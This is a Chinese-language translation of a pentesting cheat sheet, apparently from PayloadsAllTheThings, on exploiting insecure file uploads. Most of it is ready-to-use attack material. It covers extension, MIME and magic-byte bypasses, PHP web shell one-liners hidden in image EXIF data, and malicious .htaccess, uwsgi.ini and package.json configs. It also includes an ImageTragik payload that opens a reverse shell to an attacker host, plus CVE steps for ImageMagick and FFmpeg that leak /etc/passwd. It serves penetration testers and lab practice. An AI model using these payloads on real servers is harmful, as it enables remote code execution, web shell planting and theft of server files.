[原文文档](README.en.md)

# 不安全文件上传

> 如果处理不当，上传的文件可能会构成重大风险。远程攻击者可以发送带有特制文件名或 mime 类型的 multipart/form-data POST 请求并执行任意代码。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [默认扩展名](#默认扩展名)
    * [上传技巧](#上传技巧)
    * [文件名漏洞](#文件名漏洞)
    * [图片压缩](#图片压缩)
    * [图片元数据](#图片元数据)
    * [配置文件](#配置文件)
    * [CVE - ImageMagick](#cve---imagemagick)
    * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - 文件上传漏洞扫描和利用工具。
* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) - Burp 代理的 HTTP 文件上传扫描器。
* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - 用于查找文件上传功能中漏洞的 OWASP ZAP 附加组件。

## 方法论

![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)

### 默认扩展名

以下是在选定语言（PHP、ASP、JSP）中网页 shell 页面的默认扩展名列表。

* PHP 服务器

    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # 较不为人知的 PHP 扩展
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```

* ASP 服务器

    ```powershell
    .asp
    .aspx
    .config
    .cer # (IIS <= 7.5)
    .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    .shell.soap
    ```

* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`

其他可能被滥用来触发其他漏洞的扩展。

* `.svg`: XXE, XSS, SSRF
* `.gif`: XSS
* `.csv`: CSV 注入
* `.xml`: XXE
* `.avi`: LFI, SSRF
* `.js` : XSS, 开放重定向
* `.zip`: RCE, DOS, LFI 工具
* `.html` : XSS, 开放重定向

### 上传技巧

**扩展名**：

* 使用双扩展名：`.jpg.php, .png.php5`
* 使用反向双扩展名（用于利用 Apache 配置错误，其中任何具有 .php 扩展名的文件，但不一定要以 .php 结尾将执行代码）：`.php.jpg`
* 随机大小写：`.pHp, .pHP5, .PhAr`
* 零字节（对 `pathinfo()` 效果很好）
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* 特殊字符
    * 多个点：`file.php......`，在 Windows 上，当文件以点结尾创建时，这些点将被删除。
    * 空白字符和换行符
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * 从右到左覆盖 (RTLO): `name.%E2%80%AEphp.jpg` 将变为 `name.gpj.php`。
    * 斜杠：`file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * 多个特殊字符：`file.jsp/././././.`
    * UTF8 文件名：`Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt`

* 在 Windows 操作系统上，`include`、`require` 和 `require_once` 函数将把后面跟一个或多个字符 `\x20` ( )、`\x22` (")、`\x2E` (.)、`\x3C` (<)、`\x3E` (>) 的 "foo.php" 转换回 "foo.php"。
* 在 Windows 操作系统上，`fopen` 函数将把后面跟一个或多个字符 `\x2E` (.)、`\x2F` (/)、`\x5C` (\) 的 "foo.php" 转换回 "foo.php"。
* 在 Windows 操作系统上，`move_uploaded_file` 函数将把后面跟一个或多个字符 `\x2E` (.)、`\x2F` (/)、`\x5C` (\) 的 "foo.php" 转换回 "foo.php"。

* 在 Windows 操作系统上，在 IIS 上运行 PHP 时，某些字符在保存文件时会自动转换为其他字符（例如 `web<<` 变为 `web**` 并且可以替换 `web.config`）。
    * `\x3E` (>) 转换为 `\x3F` (?)
    * `\x3C` (<) 转换为 `\x2A` (*)
    * `\x22` (") 转换为 `\x2E` (.)，要在文件上传请求中使用此技巧，"`Content-Disposition`" 头应使用单引号（例如 filename='web"config'）。

**文件识别**：

MIME 类型，MIME 类型（多用途互联网邮件扩展类型）是一个标准化标识符，告诉浏览器、服务器和应用程序正在处理什么类型的文件或数据。它由一个类型和一个子类型组成，用斜杠分隔。将 `Content-Type : application/x-php` 或 `Content-Type : application/octet-stream` 更改为 `Content-Type : image/gif` 以将内容伪装成图像。

* 常见图像内容类型：

    ```cs
    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
    ```

* Content-Type 词表：[SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)

    ```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
    ```

* 两次设置 `Content-Type`，一次为不允许的类型，一次为允许的类型。

[魔法字节](https://en.wikipedia.org/wiki/List_of_file_signatures) - 有时应用程序根据文件的前几个签名字节来识别文件类型。在文件中添加/替换它们可能会欺骗应用程序。

* PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
* JPG: `\xff\xd8\xff`
* GIF: `GIF87a` 或 `GIF8;`

**文件封装**：

在 Windows 中使用 NTFS 备用数据流 (ADS)。
在这种情况下，冒号字符 ":" 将插入到禁止的扩展名之后和允许的扩展名之前。结果，将在服务器上创建一个带有禁止扩展名的空文件（例如 "`file.asax:.jpg`"）。该文件可能稍后使用其他技术进行编辑，例如使用其短文件名。"::$data" 模式也可用于创建非空文件。因此，在此模式后添加点字符也可能有助于绕过进一步限制（例如 "`file.asp::$data.`"）

**其他技术**：

PHP 网页 shell 并不总是有 `<?php` 标签，以下是一些替代方案：

* 使用 PHP 脚本标签 `<script language="php">`

    ```html
    <script language="php">system("id");</script>
    ```

* `<?=` 是 PHP 中输出值的简写语法。它相当于使用 `<?php echo`。

    ```php
    <?=`$_GET[0]`?>
    ```

### 文件名漏洞

有时漏洞不在于上传，而在于之后如何处理文件。您可能想要上传文件名中包含有效负载的文件。

* 基于时间的 SQL 注入有效负载：例如 `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* LFI/路径遍历有效负载：例如 `image.png../../../../../../../etc/passwd`
* XSS 有效负载例如 `'"><img src=x onerror=alert(document.domain)>.extension`
* 文件遍历例如 `../../../tmp/lol.png`
* 命令注入例如 `; sleep 10;`

同时您还可以上传：

* HTML/SVG 文件来触发 XSS
* EICAR 文件来检查防病毒软件的存在

### 图片压缩

创建包含 PHP 代码的有效图片。上传图片并使用**本地文件包含**来执行代码。Shell 可以用以下命令调用：`curl 'http://localhost/test.php?0=system' --data "1='ls'"`。

* 图片元数据，在元数据的注释标签内隐藏有效负载。
* 图片调整大小，在压缩算法内隐藏有效负载以绕过调整大小。同时击败 `getimagesize()` 和 `imagecreatefromgif()`。
    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): 使用 createBulletproofJPG.py
    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createPNGwithPLTE.php
    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createGIFwithGlobalColorTable.php

### 图片元数据

创建自定义图片并使用 `exiftool` 插入 exif 标签。多个 exif 标签的列表可以在 [exiv2.org](https://exiv2.org/tags.html) 找到

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### 配置文件

如果您尝试将文件上传到：

* PHP 服务器，请查看 [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) 技巧来执行代码。
* ASP 服务器，请查看 [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) 技巧来执行代码。
* uWSGI 服务器，请查看 [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) 技巧来执行代码。

配置文件示例

* [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
* [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
* [Python: \_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
* [WSGI: uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

#### Apache: .htaccess

`.htaccess` 文件中的 `AddType` 指令用于指定 Apache HTTP 服务器上不同文件扩展名的 MIME（多用途互联网邮件扩展）类型。该指令帮助服务器理解如何处理不同类型的文件以及在向客户端（如网络浏览器）提供文件时应关联什么内容类型。

以下是 AddType 指令的基本语法：

```ps1
AddType mime-type extension [extension ...]
```

通过上传包含以下内容的 .htaccess 文件来利用 `AddType` 指令。

```ps1
AddType application/x-httpd-php .rce
```

然后上传任何带有 `.rce` 扩展名的文件。

#### WSGI: uwsgi.ini

uWSGI 配置文件可以包含"魔法"变量、占位符和用精确语法定义的操作符。'@' 操作符特别用于形式 @(filename) 来包含文件的内容。支持许多 uWSGI 方案，包括"exec" - 用于从进程的标准输出读取。当解析 .ini 配置文件时，这些操作符可以被武器化用于远程命令执行或任意文件写入/读取：

恶意 `uwsgi.ini` 文件的示例：

```ini
[uwsgi]
; 从符号读取
foo = @(sym://uwsgi_funny_function)
; 从二进制追加数据读取
bar = @(data://[REDACTED])
; 从 http 读取
test = @(http://[REDACTED])
; 从文件描述符读取
content = @(fd://[REDACTED])
; 从进程标准输出读取
body = @(exec://whoami)
; 调用返回 char * 的函数
characters = @(call://uwsgi_func)
```

当配置文件被解析时（例如重启、崩溃或自动重新加载）有效负载将被执行。

#### 依赖管理器

或者您可能能够上传带有自定义脚本的 JSON 文件，尝试覆盖依赖管理器配置文件。

* package.json

    ```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
    ```

* composer.json

    ```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
    ```

### CVE - ImageMagick

如果后端使用 ImageMagick 来调整/转换用户图像，您可以尝试利用众所周知的漏洞，如 ImageTragik。

#### CVE-2016–3714 - ImageTragik

上传带有图像扩展名的此内容以利用漏洞（ImageMagick，7.0.1-1）

* ImageTragik - 示例 #1

    ```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
    ```

* ImageTragik - 示例 #3

    ```powershell
    %!PS
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
    ```

该漏洞可以通过使用 `convert` 命令来触发。

```ps1
convert shellexec.jpeg whatever.gif
```

#### CVE-2022-44268

CVE-2022-44268 是 ImageMagick 中识别的信息披露漏洞。攻击者可以通过制作恶意图像文件来利用此漏洞，当由 ImageMagick 处理时，该文件可以披露运行该软件易受攻击版本的服务器的本地文件系统中的信息。

* 生成有效负载

    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```

* 通过上传文件来触发漏洞利用。后端可能使用类似 `convert pngout.png pngconverted.png` 的命令
* 下载转换后的图片并检查其内容：`identify -verbose pngconverted.png`
* 转换泄露的数据：`python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'`

更多有效负载在文件夹 `Picture ImageMagick/` 中。

### CVE - FFMpeg HLS

FFmpeg 是一个用于处理音频和视频格式的开源软件。您可以在 AVI 视频内使用恶意 HLS 播放列表来读取任意文件。

1. `./gen_xbin_avi.py file://<filename> file_read.avi`
2. 将 `file_read.avi` 上传到处理视频文件的某个网站
3. 在服务器端，由视频服务完成：`ffmpeg -i file_read.avi output.mp4`
4. 在视频服务中点击"播放"。
5. 如果您幸运的话，您将从服务器获取 `<filename>` 的内容。

该脚本创建一个包含 GAB2 内 HLS 播放列表的 AVI。此脚本生成的播放列表如下所示：

```ps1
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

更多有效负载在文件夹 `CVE FFmpeg HLS/` 中。

## 实验室

* [PortSwigger - 文件上传实验室](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
* [Root Me - 文件上传 - 双扩展名](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
* [Root Me - 文件上传 - MIME 类型](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
* [Root Me - 文件上传 - 零字节](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
* [Root Me - 文件上传 - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
* [Root Me - 文件上传 - 混合文件](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

## 参考文献

* [一个新的"脏"任意文件写入到 RCE 的向量 - Doyensec - Maxence Schmitt 和 Lorenzo Stella - 2023年2月28日](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [Java 中的任意文件上传技巧 - pyn3rd - 2022年5月7日](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
* [通过 .htaccess 攻击 Web 服务器 - Eldar Marcussen - 2011年5月17日](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [BookFresh 棘手的文件上传绕过到 RCE - Ahmed Aboul-Ela - 2014年11月29日](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
* [防弹 JPEG 生成器 - Damien Cauquil (@virtualabs) - 2012年4月9日](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
* [在 PNG IDAT 块中编码 Web Shell - phil - 2012年6月4日](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [文件上传 - HackTricks - 2024年7月20日](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [IIS 上的文件上传和 PHP: >=? and <=* and "= - Soroush Dalili (@irsdl) - 2014年7月23日](https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/)
* [文件上传限制绕过 - Haboob 团队 - 2018年7月24日](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [IIS - SOAP - 在阴影中导航 - 0xbad53c - 2024年5月19日](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [流行图像格式中的注入点 - Daniel Kalinowski‌‌ - 2019年11月8日](https://blog.isec.pl/injection-points-in-popular-image-formats/)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - 2019年1月20日](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
* [上传并用 PHP-GD 处理的图像中的代码注入 - hackplayers - 2020年3月22日](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [把自己当成 PHP 的 PNG - Philippe Paget (@PagetPhil) - 2014年2月23日](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [更多 Ghostscript 问题：我们是否应该在默认情况下在 policy.xml 中禁用 PS 编码器？ - Tavis Ormandy - 2018年8月21日](http://openwall.com/lists/oss-security/2018/08/21/2)
* [PHDays - 视频转换器攻击：一年后 - Emil Lerner, Pavel Cheremushkin - 2017年12月20日](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
* [不受限制的文件上传漏洞的保护 - Narendra Shinde - 2015年10月22日](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [phpt 文件结构 - PHP 内部手册 - 2017年10月18日](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)